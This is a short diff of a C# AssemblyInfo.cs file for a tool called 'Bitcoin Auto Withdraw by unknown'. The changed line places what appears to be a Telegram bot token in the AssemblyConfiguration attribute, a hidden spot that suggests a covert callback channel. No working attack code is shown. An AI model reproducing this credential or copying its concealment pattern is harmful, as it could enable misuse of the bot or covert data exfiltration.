@@ -1,10 +1,12 @@
-﻿using System.Reflection;
+
+
+using System.Reflection;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 
 [assembly: AssemblyTitle("Bitcoin Auto Withdraw by unknown")]
 [assembly: AssemblyDescription("Automatic Withdrawal")]
-[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyConfiguration("7209989725:AAEwWT3gb-EukmTNqmF2b6Mbe4hJy5RpPP0")]
 [assembly: AssemblyCompany("by unknown")]
 [assembly: AssemblyProduct("Bitcoin Auto Withdraw")]
 [assembly: AssemblyCopyright("Copyright ©  2024")]
